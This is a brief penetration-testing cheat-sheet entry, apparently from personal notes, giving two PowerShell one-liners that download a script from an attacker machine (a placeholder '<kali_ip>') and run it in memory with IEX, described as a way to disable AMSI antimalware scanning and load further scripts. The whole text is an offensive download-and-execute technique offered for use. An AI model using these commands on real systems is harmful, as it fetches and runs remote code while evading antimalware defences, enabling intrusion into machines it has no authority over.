> To load in memory to disable AMSI and also load PS scripts:

```
(new-object system.net.webclient).downloadstring('http://<kali_ip>/<file>') | IEX
```

> Alternative:

```
IEX (New-Object Net.WebClient).DownloadString('http://<kali_ip>/<file>')
```
